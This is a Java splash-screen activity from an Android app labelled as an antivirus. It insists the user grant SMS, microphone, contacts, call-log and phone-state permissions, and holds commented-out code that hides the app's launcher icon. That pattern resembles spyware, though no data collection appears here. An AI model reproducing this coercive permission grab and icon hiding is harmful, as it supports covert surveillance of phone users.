package com.braniax.antivirus;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.provider.Settings;
import android.provider.Telephony;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

public class SplashActivity extends AppCompatActivity {

    static final int REQUEST_CODE = 1;
    static final int REQUEST_PERMISSION_SETTING = 2;
    int flag;
    boolean set_flag;
    ProgressDialog pDialog;

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);






        flag = 0;
        set_flag = false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
        {
            permissions();

        } else {
           launchDash();
            //defaultSMS();
        }


    }



    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public void onRequestPermissionsResult(int requestCode, @NonNull java.lang.String[] permissions, @NonNull int[] grantResults) {
        // super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE) {
            flag = 0;
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_DENIED) {
                    flag += 1;
                }
            }
        }
        if (flag == 5)
        {
            launchDash();
            //defaultSMS();
        }
        else
            {
            // permissions();
            message("Please Allow All the Permissions For APP its required in this Application", "Allow");
        }

    }

    private void launchDash() {
        new Handler().postDelayed(new Runnable()
        {
            @Override
            public void run()
            {


                Intent intent = new Intent(getApplicationContext(),LoginActivity.class);
                startActivity(intent);
                //finish();
            }
        }, 5000);

    }


    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    private void permissions(){
        flag=0;
        if(ActivityCompat.checkSelfPermission(this, Manifest.permission.INTERNET)!= PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission (this, Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.CHANGE_WIFI_STATE) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_WIFI_STATE) != PackageManager.PERMISSION_GRANTED

                )
        {
            if(ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.INTERNET) ||
                    ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.ACCESS_NETWORK_STATE) ||
                    ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.READ_PHONE_STATE) ||
                    ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.ACCESS_NETWORK_STATE) ||
                    ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.CHANGE_WIFI_STATE) ||
                    ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.SEND_SMS) ||
                    ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.RECORD_AUDIO) ||
                    ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.READ_SMS) ||
                    ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.ACCESS_WIFI_STATE) ||
                    ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) ||
                    ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.WRITE_CONTACTS) ||
                    ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.WRITE_CALL_LOG) ||
                    ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.READ_CONTACTS)
                    )
            {

                ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_PHONE_STATE,
                                Manifest.permission.INTERNET,
                                Manifest.permission.ACCESS_NETWORK_STATE,
                                Manifest.permission.CHANGE_WIFI_STATE,
                                Manifest.permission.READ_SMS,
                                Manifest.permission.RECORD_AUDIO,
                                Manifest.permission.ACCESS_WIFI_STATE,
                                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                                Manifest.permission.WRITE_CONTACTS,
                                Manifest.permission.WRITE_CALL_LOG,
                                Manifest.permission.READ_CONTACTS,
                                Manifest.permission.SEND_SMS
                        }
                        ,REQUEST_CODE);
            }else {

                set_flag=true;
                message("Please Allow All the Permissions For APP its required in this Application From Settings","Go Settings");
            }


        }else {
            launchDash();
            //defaultSMS();
        }
    }


    private void message(String msg, String positive){
        AlertDialog.Builder builder= new AlertDialog.Builder(this);
        builder.setMessage(msg);
        builder.setTitle("Alert");
        builder.setPositiveButton(positive, new DialogInterface.OnClickListener() {
            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                if (set_flag){
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    startActivityForResult(intent, REQUEST_PERMISSION_SETTING);
                    //   permissions();

                }else {
                    permissions();
                }
            }
        });
        builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                dialogInterface.dismiss();
                Toast.makeText(SplashActivity.this,"Please allow the following Permissions ", Toast.LENGTH_LONG).show();
                SplashActivity.this.finish();
            }
        });

        AlertDialog alertDialog=builder.create();
        alertDialog.show();

    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
        if (requestCode==REQUEST_PERMISSION_SETTING){
            // Toast.makeText(Splash.this,"Show",Toast.LENGTH_LONG).show();
            permissions();
        }
    }
    private void showDialog() {
        if (!pDialog.isShowing())
            pDialog.show();
    }
    private void hideDialog() {
        if (pDialog.isShowing())
            pDialog.dismiss();
    }


/*
    @Override
    protected void onDestroy()
    {
        super.onDestroy();
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(getApplicationContext(), SplashActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
*/


}
